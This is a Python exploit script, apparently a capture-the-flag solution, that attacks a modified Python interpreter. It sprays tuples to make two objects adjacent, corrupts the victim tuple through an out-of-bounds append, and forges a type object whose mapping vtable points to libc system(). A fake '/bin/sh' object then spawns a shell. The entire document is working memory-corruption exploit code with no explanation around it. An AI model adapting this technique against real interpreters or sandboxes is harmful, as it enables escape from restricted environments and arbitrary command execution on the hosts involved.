spray = []

# spray some tuples so attacker and victim are adjacent
for i in range(0x800):
    spray.append((i,))

attacker = spray[0x200]
victim = spray[0x201]
attacker_addr = id(attacker)
print_(hex(attacker_addr))
print_(hex(id(victim)))

# fake as_mapping vtable for type
libc_base = attacker_addr + 0x5af3c0
print_(hex(libc_base))
system = libc_base + 0x52290
payload_4 = bytes([i for i in ((system >> j * 8) & 0xff for j in range(8))])
fake_vtable = id(payload_4) + 0x20 - 0x8

# fake type
payload_1 = b"\x50" + b"\x00"*7 # type->refcount
payload_1 += b"\x80\x87\x90" + b"\x00"*5 # type->type
payload_1 += b"\x00" * 8
payload_1 += b"\xa3\x23\x7e" + b"\x00" * 5 # type->name
payload_1 += b"\x18" + b"\x00" * 7 # type->size
payload_1 += b"\x08" + b"\x00" * 7 # type->element_size
payload_1 += b"\x00" * 8 # type->tp_dealloc
payload_1 += b"\x00" * 8 # type->tp_vectorcall_offset
payload_1 += b"\x00" * 8 # type->tp_getattr
payload_1 += b"\x00" * 8 # type->tp_setattr
payload_1 += b"\x00" * 8 # type->tp_as_async
payload_1 += b"\x00" * 8 # type->tp_repr
payload_1 += b"\x00" * 8 # type->as_number
payload_1 += b"\x00" * 8 # type->as_sequence
payload_1 += bytes([i for i in ((fake_vtable >> j * 8) & 0xff for j in range(8))]) # type->as_mapping

fake_type = id(payload_1) + 0x20
print_(hex(fake_type))

# fake obj that uses fake type
payload_2 = b".bin/sh\x00" # refcount will increase by one changing . to /
payload_2 += bytes([i for i in ((fake_type >> j * 8) & 0xff for j in range(8))])
print_(payload_2)
fake_obj = id(payload_2) + 0x20
print_(hex(fake_obj))

# ptr to fake obj
payload_3 = bytes([i for i in ((fake_obj >> j * 8) & 0xff for j in range(8))])

append(attacker, 0x1)
append(attacker, 0x1)
append(attacker, 0x2) # victim->refcount
append(attacker, type([])) # victim->type
append(attacker, 0x2) # victim->length
append(attacker, payload_3) # victim->elements
append(attacker, 0x10) # victim->capacity

victim[4]["oops"]
